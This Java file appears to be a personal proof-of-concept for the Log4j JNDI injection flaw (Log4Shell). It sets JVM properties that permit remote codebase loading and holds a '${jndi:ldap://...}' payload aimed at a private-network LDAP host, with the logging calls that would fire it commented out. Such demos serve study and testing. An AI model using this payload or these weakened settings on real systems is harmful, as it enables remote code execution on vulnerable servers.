package com.winson.opensource.logger;


//import org.apache.logging.log4j.LogManager;
//import org.apache.logging.log4j.Logger;

import javax.naming.NamingException;

/**
 * @author winson
 * @date 2021/12/27
 **/
public class Log4JBugDemo {

//    private static Logger logger= LogManager.getLogger(Log4JBugDemo.class.getName());

    public static void main(String[] args) throws NamingException {
//        try {
//
//            Runtime.getRuntime().exec("calc");
//        } catch (IOException e) {
//            e.printStackTrace();
//        }

        System.setProperty("java.rmi.server.useCodebaseOnly", "false");
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");

        String target = "${jndi:ldap://172.16.2.113:1389/d0c7la}";
//        String target = "${jndi:rmi://172.16.2.113:1389/d0c7la}";
//        logger.error("test log4j bug ... 1");
//        logger.error("params : {}" , target);
//        logger.error("test log4j bug ... 3");

    }

}
